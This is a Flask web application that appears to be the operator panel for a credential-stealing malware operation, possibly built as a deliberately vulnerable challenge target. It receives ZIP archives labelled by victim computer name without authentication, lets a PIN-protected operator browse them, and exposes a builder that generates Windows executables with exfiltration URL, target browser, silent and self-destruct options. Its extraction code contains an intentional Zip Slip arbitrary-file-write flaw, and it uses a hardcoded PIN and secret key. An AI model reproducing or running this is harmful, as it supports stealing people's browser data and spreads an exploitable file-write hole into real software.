from flask import Flask, render_template, request, send_from_directory, flash, redirect, url_for, Response, session
import os
import zipfile
import re
from builder import build_executable
import shutil


app = Flask(__name__)
app.secret_key = "supersecretkey"  # Required for sessions

# Base directory for webapp
BASE_DIR = "/app/webapp"

# Directories
UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
UNZIPPED_FOLDER = os.path.join(BASE_DIR, "unzipped")
STATIC_FOLDER = os.path.join(BASE_DIR, "static")
BUILD_FOLDER = os.path.join(STATIC_FOLDER, "builds")

# Ensure directories exist
print("Creating directories if they don't exist")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(UNZIPPED_FOLDER, exist_ok=True)
os.makedirs(STATIC_FOLDER, exist_ok=True)
os.makedirs(BUILD_FOLDER, exist_ok=True)
print(f"Directories created: {UPLOAD_FOLDER}, {UNZIPPED_FOLDER}, {STATIC_FOLDER}, {BUILD_FOLDER}")

# Hardcoded 4-digit PIN
PIN = "1337"

# Decorator to protect routes
def login_required(f):
    def wrap(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            print("Unauthorized access, redirecting to login")
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    wrap.__name__ = f.__name__
    return wrap

@app.route("/login", methods=["GET", "POST"])
def login():
    if 'logged_in' in session and session['logged_in']:
        print("Already logged in, redirecting to uploads")
        return redirect(url_for("uploads"))
    if request.method == "POST":
        pin = request.form.get("pin")
        print(f"Login attempt with PIN: {pin}")
        if not pin or not pin.isdigit() or len(pin) != 4:
            print("Invalid PIN format")
            flash("Invalid PIN format. Please enter a 4-digit PIN.", "error")
        elif pin == PIN:
            session['logged_in'] = True
            next_url = request.args.get("next") or url_for("uploads")
            print(f"Login successful, redirecting to {next_url}")
            return redirect(next_url)
        else:
            print("Incorrect PIN")
            flash("Incorrect PIN. Please try again.", "error")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.pop('logged_in', None)
    print("Logged out")
    flash("You have been logged out.", "success")
    return redirect(url_for("login"))

@app.route("/")
@login_required
def index():
    print("Redirecting to /uploads")
    return redirect(url_for("uploads"))

@app.route("/uploads")
@login_required
def uploads():
    print(f"Listing ZIP files in {UPLOAD_FOLDER}")
    zip_files = [f for f in os.listdir(UPLOAD_FOLDER) if f.endswith(".zip")]
    print(f"ZIP files found: {zip_files}")
    print(f"Listing folders in {UNZIPPED_FOLDER}")
    unzipped_folders = [f for f in os.listdir(UNZIPPED_FOLDER) if os.path.isdir(os.path.join(UNZIPPED_FOLDER, f))]
    print(f"Unzipped folders found: {unzipped_folders}")
    return render_template("uploads.html", zip_files=zip_files, unzipped_folders=unzipped_folders)


@app.route("/file_upload", methods=["GET", "POST"])
def file_upload():
    if request.method == "GET":
        print("GET request to /file_upload")
        return {
            "error": "Method not allowed",
        }, 405

    # POST request
    errors = []
    if "file" not in request.files or "computer_name" not in request.form:
        print("Error: Missing file or computer_name")
        return {"error": "Missing archive or name."}, 400

    file = request.files["file"]
    computer_name = re.sub(r'[^\w-]', '_', request.form["computer_name"])
    print(f"Received upload request for computer: {computer_name}")

    if file.filename == "":
        print("Error: No file selected")
        return {"error": "No file selected."}, 400

    if file and file.filename.endswith(".zip"):
        zip_filename = f"{computer_name}.zip"
        zip_path = os.path.join(UPLOAD_FOLDER, zip_filename)
        print(f"Saving ZIP to {zip_path}")
        file.save(zip_path)
        print(f"Saved ZIP: {zip_path}")

        unzip_path = os.path.join(UNZIPPED_FOLDER, computer_name)
        print(f"Creating target directory {unzip_path}")
        os.makedirs(unzip_path, exist_ok=True)

        print("Extracting ZIP (vulnerable to Zip Slip)…")
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            for member in zip_ref.infolist():
                raw_name = member.filename

                # 1) Skip directory entries entirely
                if member.is_dir() or raw_name.endswith("/"):
                    # (No need to create a “directory file” on disk—os.makedirs below will handle folders.)
                    continue

                # 2) Compute destination path (Zip Slip branch vs. normal branch)
                if raw_name.startswith("/") or ".." in raw_name:
                    # Normalize absolute traversal
                    dest_path = os.path.normpath(os.path.join("/", raw_name))
                else:
                    # Safe extraction under UNZIPPED_FOLDER
                    dest_path = os.path.join(unzip_path, raw_name)

                # 3) Ensure parent directories exist
                parent_dir = os.path.dirname(dest_path)
                if parent_dir:
                    os.makedirs(parent_dir, exist_ok=True)

                # 4) Write file bytes
                with zip_ref.open(member) as src, open(dest_path, "wb") as dst:
                    shutil.copyfileobj(src, dst)

                print(f"  → Wrote {raw_name!r} → {dest_path!r}")

        print("Finished extraction (with Zip Slip).")
        return {"status": "success", "computer_name": computer_name}, 200

    print("Error: Invalid file type")
    return {"error": "Invalid file type."}, 400


@app.route("/files/<path:filename>")
@login_required
def serve_file(filename):
    if filename.endswith(".zip"):
        print(f"Serving ZIP file: {filename} from {UPLOAD_FOLDER}")
        return send_from_directory(UPLOAD_FOLDER, filename)
    elif filename.endswith(".exe") and filename.startswith("builds/"):
        build_filename = filename[len("builds/"):]
        print(f"Serving executable: {build_filename} from {BUILD_FOLDER}")
        return send_from_directory(BUILD_FOLDER, build_filename)
    print(f"Serving unzipped file: {filename} from {UNZIPPED_FOLDER}")
    return send_from_directory(UNZIPPED_FOLDER, filename)

@app.route("/view/<path:filename>")
@login_required
def view_file(filename):
    file_path = os.path.join(UNZIPPED_FOLDER, filename)
    print(f"Viewing file: {file_path}")
    if not os.path.isfile(file_path):
        print(f"Error: File not found: {file_path}")
        return {"error": "File not found"}, 404
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        print(f"Successfully read file: {file_path}")
        return Response(content, mimetype='text/plain')
    except (UnicodeDecodeError, IOError):
        print(f"Error: Cannot read file as text: {file_path}")
        return {"error": "Cannot read file as text"}, 400

@app.route("/explore/<path:folder>")
@login_required
def explore_folder(folder):
    print(f"Exploring folder: {folder}")
    folder_path = os.path.join(UNZIPPED_FOLDER, folder)
    print(f"Folder path: {folder_path}")
    if not os.path.isdir(folder_path):
        print(f"Error: Folder not found: {folder_path}")
        return {"error": "Folder not found"}, 404

    items = []
    for item in os.listdir(folder_path):
        item_path = os.path.join(folder_path, item)
        rel_path = os.path.relpath(item_path, UNZIPPED_FOLDER)
        items.append({
            "name": item,
            "path": rel_path,
            "is_dir": os.path.isdir(item_path)
        })
    print(f"Items in {folder_path}: {items}")
    return {"items": items}


@app.route("/builder", methods=["GET", "POST"])
@login_required
def builder():
    print(f"Listing executables in {BUILD_FOLDER}")
    exe_files = [f for f in os.listdir(BUILD_FOLDER) if f.endswith(".exe")]
    print(f"Executables found: {exe_files}")
    
    if request.method == "POST":
        exe_name = request.form.get("exe_name")
        upload_url = request.form.get("upload_url")
        target_browser = int(request.form.get("target_browser"))
        upload_interval = int(request.form.get("upload_interval"))
        self_destruct = "self_destruct" in request.form
        silent = "silent" in request.form

        print(f"Building executable: {exe_name} with URL: {upload_url}, browser: {target_browser}, interval: {upload_interval}, self_destruct: {self_destruct}, silent: {silent}")

        if not exe_name.endswith(".exe") or not re.match(r'^[a-zA-Z0-9_-]+\.exe$', exe_name):
            print(f"Error: Invalid executable name: {exe_name}")
            flash("Executable name must end with .exe and contain only letters, numbers, underscores, or hyphens", "error")
            return redirect(url_for("builder"))

        success, result = build_executable(
            exe_name=exe_name,
            upload_url=upload_url,
            target_browser=target_browser,
            upload_interval=upload_interval,
            self_destruct=self_destruct,
            silent=silent,
            output_dir=BUILD_FOLDER
        )

        if success:
            print(f"Executable built successfully: {result}")
            flash("Executable built successfully! Download it from the table below.", "success")
            return redirect(url_for("builder"))
        else:
            print(f"Build failed: {result}")
            flash(f"Build failed: {result}", "error")
            return redirect(url_for("builder"))

    return render_template("builder.html", exe_files=exe_files)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=49858, debug=False)
